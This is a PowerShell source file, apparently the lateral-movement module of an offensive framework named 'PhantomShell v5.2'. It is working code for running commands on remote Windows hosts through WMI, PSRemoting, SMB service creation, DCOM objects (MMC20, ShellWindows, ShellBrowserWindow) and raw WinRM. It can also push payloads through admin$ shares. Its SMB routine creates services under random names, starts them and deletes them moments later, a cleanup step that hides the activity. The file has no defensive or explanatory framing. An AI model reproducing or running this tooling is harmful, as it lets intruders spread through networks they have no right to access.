# PhantomShell v5.2 - Lateral Movement Module
# Remote execution via WMI, PSRemoting, SMB, DCOM, WinRM

$ModuleCommands = @{
    "wmi-exec"     = @{ Handler = { param($a) Invoke-WMIExec @a }; Description = "Remote exec via WMI Win32_Process" }
    "psremoting"   = @{ Handler = { param($a) Invoke-PSRemoting @a }; Description = "Remote exec via PowerShell Remoting" }
    "smb-exec"     = @{ Handler = { param($a) Invoke-SMBExec @a }; Description = "Remote exec via SMB service creation" }
    "dcom-exec"    = @{ Handler = { param($a) Invoke-DCOMExec @a }; Description = "Remote exec via DCOM objects" }
    "winrm-exec"   = @{ Handler = { param($a) Invoke-WinRMExec @a }; Description = "Remote exec via raw WinRM" }
    "copy-remote"  = @{ Handler = { param($a) Copy-FileRemote @a }; Description = "Copy file via admin$ share" }
}

# --- Credential Helper ---
function New-CredentialObject {
    param([string]$Username, [string]$Password, [string]$Domain)
    if (-not $Username -or -not $Password) { return $null }
    $fullUser = if ($Domain) { "$Domain\$Username" } else { $Username }
    $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
    return New-Object System.Management.Automation.PSCredential($fullUser, $secPass)
}

# --- WMI Exec ---
function Invoke-WMIExec {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $command = $Args.command
        if (-not $target -or -not $command) {
            return @{ status = "error"; output = "Required: target, command" }
        }

        $connOpts = New-Object System.Management.ConnectionOptions
        if ($Args.username -and $Args.password) {
            $connOpts.Username = if ($Args.domain) { "$($Args.domain)\$($Args.username)" } else { $Args.username }
            $connOpts.Password = $Args.password
        }
        $connOpts.Impersonation = [System.Management.ImpersonationLevel]::Impersonate
        $connOpts.EnablePrivileges = $true

        $scope = New-Object System.Management.ManagementScope("\\$target\root\cimv2", $connOpts)
        $scope.Connect()

        $processClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]"Win32_Process", $null)

        $inParams = $processClass.GetMethodParameters("Create")
        $inParams["CommandLine"] = $command

        $outParams = $processClass.InvokeMethod("Create", $inParams, $null)
        $returnVal = $outParams["ReturnValue"]
        $processId = $outParams["ProcessId"]

        if ($returnVal -eq 0) {
            return @{ status = "ok"; output = "Process created on $target"; pid = $processId }
        } else {
            $errorCodes = @{2="Access Denied";3="Insufficient Privilege";8="Unknown Failure";9="Path Not Found";21="Invalid Parameter"}
            $errMsg = if ($errorCodes.ContainsKey([int]$returnVal)) { $errorCodes[[int]$returnVal] } else { "Error code: $returnVal" }
            return @{ status = "error"; output = $errMsg }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- PSRemoting ---
function Invoke-PSRemoting {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $command = $Args.command
        if (-not $target -or -not $command) {
            return @{ status = "error"; output = "Required: target, command" }
        }

        $params = @{ ComputerName = $target; ScriptBlock = [scriptblock]::Create($command) }

        if ($Args.username -and $Args.password) {
            $cred = New-CredentialObject -Username $Args.username -Password $Args.password -Domain $Args.domain
            $params["Credential"] = $cred
        }

        if ($Args.use_ssl) {
            $params["UseSSL"] = $true
            $params["SessionOption"] = New-PSSessionOption -SkipCACheck -SkipCNCheck
        }

        $output = Invoke-Command @params 2>&1 | Out-String
        return @{ status = "ok"; output = $output.Trim() }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- SMB Exec (file copy + service creation) ---
function Invoke-SMBExec {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $command = $Args.command
        if (-not $target -or -not $command) {
            return @{ status = "error"; output = "Required: target, command" }
        }

        $svcName = if ($Args.service_name) { $Args.service_name } else { "PS" + (Get-Random -Maximum 9999) }

        # Connect to remote admin share if credentials provided
        if ($Args.username -and $Args.password) {
            $netUser = if ($Args.domain) { "$($Args.domain)\$($Args.username)" } else { $Args.username }
            $null = & net.exe use "\\$target\admin`$" /user:$netUser $Args.password 2>&1
        }

        # If a payload path is specified, copy it first
        if ($Args.payload_path) {
            $remotePath = "\\$target\admin`$\$svcName.exe"
            Copy-Item -Path $Args.payload_path -Destination $remotePath -Force -ErrorAction Stop
            $command = "C:\Windows\$svcName.exe"
        }

        # Create and start service via sc.exe
        $scCreate = & sc.exe "\\$target" create $svcName binPath= "cmd.exe /c $command" start= demand type= own 2>&1
        $scStart = & sc.exe "\\$target" start $svcName 2>&1

        # Cleanup: delete service after brief delay
        Start-Sleep -Seconds 2
        $scDelete = & sc.exe "\\$target" delete $svcName 2>&1

        # Disconnect share
        if ($Args.username) {
            $null = & net.exe use "\\$target\admin`$" /delete /y 2>&1
        }

        return @{
            status = "ok"
            output = "Service $svcName created, started, and cleaned on $target"
            detail = @{
                create = ($scCreate | Out-String).Trim()
                start  = ($scStart | Out-String).Trim()
                delete = ($scDelete | Out-String).Trim()
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- DCOM Exec ---
function Invoke-DCOMExec {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $command = $Args.command
        $method = if ($Args.method) { $Args.method } else { "MMC20" }
        if (-not $target -or -not $command) {
            return @{ status = "error"; output = "Required: target, command" }
        }

        switch ($method) {
            "MMC20" {
                # MMC20.Application
                $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
                $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $command", "7")
                return @{ status = "ok"; output = "Executed via MMC20.Application on $target" }
            }
            "ShellWindows" {
                # ShellWindows
                $com = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"9BA05972-F6A8-11CF-A442-00A0C90A8F39", $target))
                $item = $com.Item()
                $item.Document.Application.ShellExecute("cmd.exe", "/c $command", "C:\Windows\System32", $null, 0)
                return @{ status = "ok"; output = "Executed via ShellWindows on $target" }
            }
            "ShellBrowserWindow" {
                # ShellBrowserWindow
                $com = [activator]::CreateInstance([type]::GetTypeFromCLSID([guid]"C08AFD90-F2A1-11D1-8455-00A0C91F3880", $target))
                $com.Document.Application.ShellExecute("cmd.exe", "/c $command", "C:\Windows\System32", $null, 0)
                return @{ status = "ok"; output = "Executed via ShellBrowserWindow on $target" }
            }
            default {
                return @{ status = "error"; output = "Unknown DCOM method. Use: MMC20, ShellWindows, ShellBrowserWindow" }
            }
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- WinRM Exec (raw, without PSRemoting) ---
function Invoke-WinRMExec {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $command = $Args.command
        if (-not $target -or -not $command) {
            return @{ status = "error"; output = "Required: target, command" }
        }

        $port = if ($Args.port) { [int]$Args.port } else { 5985 }
        $scheme = if ($Args.use_ssl) { "https" } else { "http" }
        $uri = "${scheme}://${target}:${port}/wsman"

        $wsMan = New-Object -ComObject WSMan.Automation
        $connOpts = $wsMan.CreateConnectionOptions()

        if ($Args.username -and $Args.password) {
            $connOpts.UserName = if ($Args.domain) { "$($Args.domain)\$($Args.username)" } else { $Args.username }
            $connOpts.Password = $Args.password
        }

        $flags = 0
        if ($Args.use_ssl) { $flags = $flags -bor 0x2000000 }  # WSMAN_FLAG_USE_SSL
        if ($Args.skip_ca_check) { $flags = $flags -bor 0x2000 }  # WSMAN_FLAG_SKIP_CA_CHECK

        $session = $wsMan.CreateSession($uri, $flags, $connOpts)

        # Create shell
        $shellId = $session.Invoke("Create", "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd", @"
<Shell xmlns="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
    <InputStreams>stdin</InputStreams>
    <OutputStreams>stdout stderr</OutputStreams>
</Shell>
"@)

        # Execute command
        $commandXml = @"
<CommandLine xmlns="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd">
    <Command>cmd.exe /c $([System.Security.SecurityElement]::Escape($command))</Command>
</CommandLine>
"@
        $commandResp = $session.Invoke("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
            "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd/$shellId", $commandXml)

        # Parse command ID from response
        $cmdXml = [xml]$commandResp
        $commandId = $cmdXml.CommandResponse.CommandId

        # Receive output
        $receiveXml = @"
<Receive xmlns="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" SequenceId="0">
    <DesiredStream CommandId="$commandId">stdout stderr</DesiredStream>
</Receive>
"@
        $output = $session.Invoke("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
            "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd/$shellId", $receiveXml)

        # Cleanup
        try {
            $session.Invoke("http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal",
                "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd/$shellId",
                "<Signal xmlns='http://schemas.microsoft.com/wbem/wsman/1/windows/shell' CommandId='$commandId'><Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</Code></Signal>")
            $session.Invoke("Delete", "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd/$shellId", $null)
        } catch {}

        return @{ status = "ok"; output = $output }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}

# --- Copy File via Admin$ Share ---
function Copy-FileRemote {
    param([hashtable]$Args = @{})
    try {
        $target = $Args.target
        $localPath = $Args.local_path
        $remotePath = $Args.remote_path
        if (-not $target -or -not $localPath -or -not $remotePath) {
            return @{ status = "error"; output = "Required: target, local_path, remote_path" }
        }

        # Map share if credentials provided
        $share = if ($Args.share) { $Args.share } else { "admin`$" }
        $uncPath = "\\$target\$share"
        $connected = $false

        if ($Args.username -and $Args.password) {
            $netUser = if ($Args.domain) { "$($Args.domain)\$($Args.username)" } else { $Args.username }
            $null = & net.exe use $uncPath /user:$netUser $Args.password 2>&1
            $connected = $true
        }

        # Build destination path on UNC share
        $relPath = $remotePath -replace '^C:\\Windows\\','' -replace '^C:\\',''
        $destUNC = Join-Path $uncPath $relPath

        # Ensure destination directory exists
        $destDir = Split-Path $destUNC -Parent
        if (-not (Test-Path $destDir)) {
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        }

        Copy-Item -Path $localPath -Destination $destUNC -Force -ErrorAction Stop
        $fileSize = (Get-Item $destUNC).Length

        # Disconnect share
        if ($connected) {
            $null = & net.exe use $uncPath /delete /y 2>&1
        }

        return @{
            status = "ok"
            output = "Copied $localPath to \\$target\$share\$relPath ($fileSize bytes)"
        }
    } catch {
        return @{ status = "error"; output = $_.Exception.Message }
    }
}
